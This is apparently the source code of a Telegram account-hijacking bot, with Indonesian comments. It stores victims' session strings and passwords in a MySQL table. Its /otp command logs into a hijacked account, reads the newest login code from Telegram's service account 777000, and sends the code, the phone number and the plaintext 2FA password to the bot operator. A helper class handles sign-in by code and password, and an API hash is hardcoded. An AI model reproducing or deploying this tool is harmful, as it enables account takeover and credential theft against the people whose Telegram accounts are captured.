const fs = require('fs');
const { Telegraf , Markup } = require('telegraf')
var mysql = require('mysql');
require("./editdisini.js")
const bot = new Telegraf(global.tokenbot);
const { Api, TelegramClient, password } = require("telegram");
const { computeCheck } = require("telegram/Password");
const { StringSession } = require("telegram/sessions");
const axios = require('axios');
const apiId = 25198198 * 1;
const apiHash = "f276f8a2346f4cf13762c86ef4ca7067";
const clients = {};



const statusFile = 'displayedOtp.json';

// Pastikan file status ada, jika tidak buat file kosong
if (!fs.existsSync(statusFile)) {
  fs.writeFileSync(statusFile, JSON.stringify([]));
}

// Fungsi untuk membaca status data yang sudah ditampilkan
const getDisplayedData = () => {
    const data = JSON.parse(fs.readFileSync(statusFile));
    return data;
};

// Fungsi untuk menyimpan status data yang sudah ditampilkan
const saveDisplayedData = (displayed) => {


  
    fs.writeFileSync(statusFile, JSON.stringify(displayed, null, 2));
};

// Start command: when a user starts the bot, the bot sends a welcome message
bot.start((ctx) => {
  ctx.reply('SELAMAT DATANG DI BOT TELEAUTO.');
});

// Menu Command
bot.command('menu', (ctx) => {
  ctx.reply('menu:\n/start - Start bot\n/list - untuk melihat nomer Yang Login\n/otp +628 - Untuk Mendapatkan Kode Terbaru');
});

// Function to connect to the database and query data
const pool = mysql.createPool({
  host: global.host,
  port: global.port,
  user: global.user,
  password: global.password,
  database: global.database,
  connectionLimit: 10 // Limit the number of concurrent connections to the database
});

// Wrapper function to execute queries using the connection pool
const executeQuery = (sql, params) => {
  return new Promise((resolve, reject) => {
    pool.query(sql, params, (err, result) => {
      if (err) {
        reject(err);
      } else {
        resolve(result);
      }
    });
  });
};

// Command 'list' to fetch and display data
bot.command('list', async (ctx) => {
  const inputid = ctx.update.message.from.id;
  const displayedData = getDisplayedData(); // Function to get the displayed data (list of checked numbers)

  const sql = "SELECT * FROM `telebot`"; // Query to fetch data from the database

  try {
    // Fetch data from the database
    const result = await executeQuery(sql, []); // Executes query with no parameters

    // Filter the results based on the inputid
    let data = result.filter(hsl => hsl.post == inputid);

    // Remove duplicates by phone number
    data = data.filter((value, index, self) => 
      index === self.findIndex((t) => t.phone === value.phone)
    );

    if (data.length === 0) {
      return ctx.reply('Tidak ada data untuk ID ini.');
    }

    const itemsPerMessage = 20; // Define 20 items per message
    const totalChunks = Math.ceil(data.length / itemsPerMessage); // Total chunks based on data size
    let messageIndex = 0;

    // Function to send data in chunks sequentially
    const sendInChunks = async () => {
      while (messageIndex < totalChunks) {
        const startIdx = messageIndex * itemsPerMessage;
        const chunk = data.slice(startIdx, startIdx + itemsPerMessage);
        let message = `Daftar Nomor Telegram (Bagian ${messageIndex + 1} dari ${totalChunks}):\n\n`;

        // Add phone numbers and their status, wrapped in <code> for easy copying
        chunk.forEach((item, index) => {
          const status = displayedData.includes(item.phone) ? "SUDAH" : "BELUM";
          message += `${startIdx + index + 1}. <code>${item.phone}</code> : (${status})\n`;
        });

        // Send the message for the current chunk with HTML parsing
        await ctx.reply(message, { parse_mode: 'HTML' });

        // Increment the message index to move to the next part
        messageIndex++;

        // Wait a bit before sending the next message to ensure sequential delivery
        await new Promise(resolve => setTimeout(resolve, 1000)); // 1-second delay
      }
    };

    // Start sending the data in chunks
    await sendInChunks();

  } catch (err) {
    ctx.reply(`Error processing data: ${err.message}`);
  }
});

// Command 'otp' to check a specific phone number
bot.command('otp', async (ctx) => {
  const phone = ctx.message.text.split(' ').slice(1).join(' '); // Extract phone number
  const inputid = ctx.update.message.from.id;
  const displayedData = getDisplayedData(); // Function to get the displayed data

  const sql = "SELECT * FROM `telebot` WHERE `post` = ? AND `phone` = ?"; // Query to check for specific phone number

  try {
    const rows = await executeQuery(sql, [inputid, phone]); // Execute query with parameters

    if (rows.length === 0) {
      return ctx.reply('Nomor telepon atau ID tidak ditemukan.');
    }

    const user = rows[0];
    const strngsess = user.params;
    const password = user.password;

    const client = new CreateClient(strngsess); // Assuming CreateClient is defined somewhere

    try {
      await client.connect();
      const msgs = await client.getMessages("777000", { limit: 1 });

      // Send the details back to the user
      ctx.reply(`DETAIL TELEGRAM :\nNomor : ${phone}\nPassword : ${password}\nPesan:\n ${msgs[0].message}`);

  
      if (!displayedData.includes(phone)) {
        displayedData.push(phone);
        saveDisplayedData(displayedData); // Function to save updated displayed data
      }

    } catch (error) {
      console.log(error);
      // Delete the user record if unable to connect
      await executeQuery("DELETE FROM `telebot` WHERE `phone` = ?", [user.phone]);
      ctx.reply(`Menghapus ${user.phone} karena Sudah terlog out`);
    }

  } catch (err) {
    console.error('Unexpected error:', err);
    return ctx.reply('Terjadi kesalahan yang tidak terduga.');
  }
});

// Launch the bot
bot.launch();

// Handle uncaught exceptions globally
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});




class CreateClient extends TelegramClient {
    constructor(session = "") {
      super(new StringSession(session), apiId, apiHash, {
        connectionRetries: 5,
      });
    }
    async getCode(number) {
      const client = this;
      this.phoneNumber = number;
      const apiCredentials = {
        apiId: client.apiId,
        apiHash: client.apiHash,
      };
  
      const sendCodeResult = await client.sendCode(apiCredentials, number, false);
    const phoneCodeHashT = sendCodeResult.phoneCodeHash;
      const isCodeViaAppT = sendCodeResult.isCodeViaApp;
      this.phoneCodeHash = phoneCodeHashT;
      this.isCodeViaApp = isCodeViaAppT;
      if (typeof this.phoneCodeHash !== "string") {
        return "500";
      }
      
       return {phoneCodeHashT,isCodeViaAppT}
       
    }
  
    async setCode(code) {
      const client = this;
      try {
        this.phoneCode = code;
        const result = await client.invoke(
          new Api.auth.SignIn({
            phoneNumber: this.phoneNumber,
            phoneCodeHash: this.phoneCodeHash,
            phoneCode: this.phoneCode,
          })
        );
        if (result instanceof Api.auth.AuthorizationSignUpRequired) {
          this.isRegistrationRequired = true;
          console.log("Registration required");
          this.termsOfService = result.termsOfService;
          return;
        }
        
        
        return {result};
        
        
        
        
      } catch (error) {
        if (error.errorMessage === "SESSION_PASSWORD_NEEDED") {
          this.needPassword = true;
          return {error};
        }else{
            
            return error.errorMessage;   
        }
      }
    }
    async setPassword(password) {
      const client = this;
      try {
        const passwordSrpResult = await client.invoke(
          new Api.account.GetPassword()
        );
        const passwordSrpCheck = await computeCheck(passwordSrpResult, password);
        const { user } = await client.invoke(
          new Api.auth.CheckPassword({
            password: passwordSrpCheck,
          })
        );

        return user;
      } catch (error) {
        return error.errorMessage;
     }
    }
  }
  
  











